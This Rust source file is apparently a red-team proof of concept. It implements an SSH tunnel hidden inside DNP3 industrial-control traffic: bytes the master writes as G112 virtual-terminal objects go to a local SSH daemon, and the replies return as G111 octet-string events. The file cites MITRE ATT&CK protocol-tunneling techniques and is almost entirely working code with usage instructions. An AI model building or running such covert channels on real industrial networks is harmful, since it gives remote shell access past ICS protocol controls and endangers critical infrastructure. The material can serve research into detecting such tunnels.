//! PoC 3: SSH Tunnel Server over DNP3 Virtual Terminal
//!
//! Runs on the outstation/IED side. Listens for DNP3 connections on port 20000,
//! receives data via G112 (VT Output) writes from the master, and forwards it to
//! a local SSH daemon. Responses from the SSH daemon are returned as G111 (OctetString)
//! events that the master polls.
//!
//! ## Usage
//!
//! ```bash
//! cargo run -p example-virtual-terminal --bin vt_tunnel_server -- --target 127.0.0.1:22
//! ```
//!
//! ## MITRE ATT&CK References
//! - T1572: Protocol Tunneling
//! - T1071: Application Layer Protocol
//! - T0869: Standard Application Layer Protocol (ICS)

use std::time::Duration;

use dnp3::app::measurement::OctetString;
use dnp3::app::control::CommandStatus;
use dnp3::app::*;
use dnp3::link::*;
use dnp3::outstation::database::*;
use dnp3::outstation::*;
use dnp3::tcp::*;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::mpsc;

/// Maximum bytes per OctetString event chunk (G111 max variation = 255, we stay well under)
const CHUNK_SIZE: usize = 240;
/// VT port index used for the tunnel
const VT_PORT: u16 = 0;

// ─── Application callbacks ───────────────────────────────────────────────────

/// OutstationApplication that forwards incoming G112 writes to an mpsc channel.
struct VtOutstationApp {
    /// Sends raw bytes received via G112 writes toward the SSH bridge task.
    to_ssh_tx: mpsc::UnboundedSender<Vec<u8>>,
}

impl OutstationApplication for VtOutstationApp {
    fn handle_virtual_terminal_write(
        &mut self,
        port: u16,
        data: &[u8],
    ) -> Result<(), RequestError> {
        if port == VT_PORT {
            let _ = self.to_ssh_tx.send(data.to_vec());
        }
        Ok(())
    }
}

struct NullInfo;
impl OutstationInformation for NullInfo {}

// ─── Command-line args ───────────────────────────────────────────────────────

struct Args {
    dnp3_listen: String,
    target: String,
    outstation_addr: u16,
    master_addr: u16,
}

impl Default for Args {
    fn default() -> Self {
        Self {
            dnp3_listen: "0.0.0.0:20000".into(),
            target: "127.0.0.1:22".into(),
            outstation_addr: 10,
            master_addr: 1,
        }
    }
}

fn parse_args() -> Args {
    let mut args = Args::default();
    let mut argv = std::env::args().skip(1);
    while let Some(arg) = argv.next() {
        match arg.as_str() {
            "-d" | "--dnp3-listen" => {
                if let Some(v) = argv.next() {
                    args.dnp3_listen = v;
                }
            }
            "-t" | "--target" => {
                if let Some(v) = argv.next() {
                    args.target = v;
                }
            }
            "--outstation-addr" => {
                if let Some(v) = argv.next() {
                    args.outstation_addr = v.parse().unwrap_or(10);
                }
            }
            "--master-addr" => {
                if let Some(v) = argv.next() {
                    args.master_addr = v.parse().unwrap_or(1);
                }
            }
            "-h" | "--help" => {
                println!("DNP3-SSH Tunnel Server");
                println!("  -d, --dnp3-listen <ADDR>  DNP3 listen address [default: 0.0.0.0:20000]");
                println!("  -t, --target <ADDR>        Target endpoint [default: 127.0.0.1:22]");
                println!("  --outstation-addr <N>      DNP3 outstation address [default: 10]");
                println!("  --master-addr <N>          DNP3 master address [default: 1]");
                std::process::exit(0);
            }
            _ => {
                eprintln!("Unknown argument: {}", arg);
                std::process::exit(1);
            }
        }
    }
    args
}

// ─── Main ────────────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .with_target(false)
        .init();

    let args = parse_args();

    println!();
    println!("================================================================");
    println!("  PoC 3: DNP3-SSH Tunnel Server (Real DNP3)");
    println!("================================================================");
    println!("  DNP3 Listen:  {}", args.dnp3_listen);
    println!("  Target SSH:   {}", args.target);
    println!("  Outstation:   {}", args.outstation_addr);
    println!("  Master:       {}", args.master_addr);
    println!();

    // Channel: G112 writes → SSH bridge
    let (to_ssh_tx, to_ssh_rx) = mpsc::unbounded_channel::<Vec<u8>>();

    // Build the outstation config
    let outstation_config = OutstationConfig::new(
        EndpointAddress::try_new(args.outstation_addr)?,
        EndpointAddress::try_new(args.master_addr)?,
        EventBufferConfig::new(0, 0, 0, 0, 0, 0, 0, 64), // 64 octet-string events
    );

    // Create DNP3 TCP server
    let mut server = Server::new_tcp_server(
        LinkErrorMode::Close,
        args.dnp3_listen.parse()?,
    );

    let outstation = server.add_outstation(
        outstation_config,
        Box::new(VtOutstationApp {
            to_ssh_tx,
        }),
        Box::new(NullInfo),
        DefaultControlHandler::with_status(CommandStatus::NotSupported),
        NullListener::create(),
        AddressFilter::Any,
    )?;

    // Add OctetString point at index VT_PORT for carrying SSH→master data
    outstation.transaction(|db| {
        db.add(VT_PORT, Some(EventClass::Class1), OctetStringConfig);
    });

    // Bind the server - keep the handle alive or the server shuts down
    let _server_handle = server.bind().await?;
    println!("[Server] DNP3 outstation listening on port 20000");
    println!("[Server] Waiting for master to connect...");

    // Run the SSH bridge in a separate task
    let db_handle = outstation.clone();
    let target = args.target.clone();
    tokio::spawn(async move {
        run_ssh_bridge(to_ssh_rx, db_handle, target).await;
    });

    // Keep the server alive until Ctrl-C
    let _ = tokio::signal::ctrl_c().await;
    println!("[Server] Shutting down");
    Ok(())
}

// ─── SSH Bridge ──────────────────────────────────────────────────────────────

/// Bridges G112 writes (from master) to an SSH daemon, and sends SSH responses
/// back as G111 (OctetString) events that the master polls.
async fn run_ssh_bridge(
    mut from_master_rx: mpsc::UnboundedReceiver<Vec<u8>>,
    db: OutstationHandle,
    target_addr: String,
) {
    let mut ssh_stream: Option<TcpStream> = None;
    let mut read_buf = vec![0u8; 4096];

    loop {
        // Wait for either incoming G112 data or readable SSH data
        tokio::select! {
            // G112 write from master → forward to SSH server
            msg = from_master_rx.recv() => {
                let Some(data) = msg else { break };

                if ssh_stream.is_none() {
                    // First data chunk: open connection to SSH server
                    println!("[Bridge] Connecting to SSH server at {}", target_addr);
                    match TcpStream::connect(&target_addr).await {
                        Ok(stream) => {
                            println!("[Bridge] Connected to SSH server");
                            ssh_stream = Some(stream);
                        }
                        Err(e) => {
                            eprintln!("[Bridge] Failed to connect to SSH server: {}", e);
                            continue;
                        }
                    }
                }

                if let Some(ref mut stream) = ssh_stream {
                    println!("[Bridge] Master → SSH: {} bytes", data.len());
                    if let Err(e) = stream.write_all(&data).await {
                        eprintln!("[Bridge] SSH write error: {}", e);
                        ssh_stream = None;
                    }
                }
            }

            // Data from SSH server → send as G111 events to master
            result = async {
                match &mut ssh_stream {
                    Some(s) => s.read(&mut read_buf).await,
                    None => std::future::pending().await,
                }
            } => {
                match result {
                    Ok(0) => {
                        println!("[Bridge] SSH server closed connection");
                        ssh_stream = None;
                    }
                    Ok(n) => {
                        let data = read_buf[..n].to_vec();
                        println!("[Bridge] SSH → Master: {} bytes", data.len());
                        send_as_events(&db, &data);
                    }
                    Err(e) => {
                        eprintln!("[Bridge] SSH read error: {}", e);
                        ssh_stream = None;
                    }
                }
            }
        }
    }
}

/// Chunk `data` into CHUNK_SIZE pieces and store each as an OctetString event
/// at point index VT_PORT with EventMode::Force so a new event is always generated.
fn send_as_events(db: &OutstationHandle, data: &[u8]) {
    for chunk in data.chunks(CHUNK_SIZE) {
        let chunk = chunk.to_vec();
        // EventMode::Force: always generate event even if value unchanged
        // update_static: false: don't change the static value (not needed for streaming)
        if let Ok(os) = OctetString::new(&chunk) {
            db.transaction(|db| {
                db.update(
                    VT_PORT,
                    &os,
                    UpdateOptions::new(false, EventMode::Force),
                );
            });
        }
    }
}
